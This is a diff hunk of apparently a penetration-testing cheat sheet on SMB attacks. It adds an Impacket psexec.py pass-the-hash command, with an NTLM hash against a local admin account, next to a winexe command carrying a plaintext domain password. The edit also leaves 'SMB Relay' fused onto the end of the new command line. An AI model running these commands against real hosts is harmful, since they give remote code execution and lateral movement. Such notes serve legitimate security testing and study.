@@ -34,7 +34,11 @@ smbclient \\\\[ip]\\[share name]
 /usr/bin/winexe -U mad01/user123%abcABC1234 //172.18.2.50 ipconfig
 ```
 
-## SMB Relay
+### Using psexec from Impacket
+
+```
+/usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a40cad43aedd6bdddddddddf45 localadmin@192.168.93.19SMB Relay
+```
 
 ### MultiRelay.py
 
